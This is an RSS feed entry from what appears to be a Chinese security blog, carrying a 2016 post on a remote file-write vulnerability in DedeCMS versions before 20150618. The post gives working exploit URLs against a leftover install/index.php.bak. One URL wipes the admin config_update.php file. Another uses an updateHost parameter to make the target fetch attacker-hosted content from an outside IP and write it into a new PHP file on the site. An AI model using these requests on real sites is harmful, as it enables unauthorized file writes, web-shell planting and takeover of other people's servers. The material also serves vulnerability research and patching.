<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Dedecms on </title>
    <link>http://wyb0.com/tags/dedecms/</link>
    <description>Recent content in Dedecms on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Fri, 05 Aug 2016 23:29:20 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/dedecms/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Dedecms远程写文件漏洞</title>
      <link>http://wyb0.com/posts/dedecms-remote-write-file-vulnerability/</link>
      <pubDate>Fri, 05 Aug 2016 23:29:20 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/dedecms-remote-write-file-vulnerability/</guid>
      <description>

&lt;h3 id=&#34;0x00-关于漏洞:097081480f55c55e59eccaaebf4019e5&#34;&gt;0x00 关于漏洞&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;Dedecms在20150618之前的版本都存在远程写文件漏洞，主要起因是Apache的解析漏洞
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-利用条件:097081480f55c55e59eccaaebf4019e5&#34;&gt;0x01 利用条件&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;dedecms版本为20150618之前的  
安装目录install下的index.php.bak文件未被删除
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-实例:097081480f55c55e59eccaaebf4019e5&#34;&gt;0x02 实例&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;查看cms版本

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dedecms_before_20150617_check_version.png&#34; alt=&#34;查看织梦cms版本&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;清空文件&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;http://www.xxxx.com/install/index.php.bak?step=11&amp;amp;insLockfile=a
&amp;amp;s_lang=a&amp;amp;install_demo_name=../data/admin/config_update.php
访问上面的链接会使服务器到http://updatenew.dedecms.com/base-v57/dedecms/
demodata.a.txt中读取内容写入到config_update.php，但demodata.a.txt为空，
所以就清空了config_update.php
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dedecms_before_20150617_clear_config_update.png&#34; alt=&#34;清空文件config_update&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;在自己的服务器上创建文件

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dedecms_before_20150617_construction_file.png&#34; alt=&#34;在自己的服务器上构造文件&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;写入文件&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;访问http://www.xxxx.com/install/index.php.bak?step=11&amp;amp;insLockfile=a
&amp;amp;s_lang=a&amp;amp;install_demo_name=info.php&amp;amp;updateHost=http://123.123.123.123/
将自己的网站的dedecoms/demodata.a.txt写入到目标站点的install/下的info.php中
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dedecms_before_20150617_write_file.png&#34; alt=&#34;将自己构造的内容写入到文件&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;访问生成的文件

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dedecms_before_20150617_visit_written_file.png&#34; alt=&#34;访问写入我们内容的文件&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>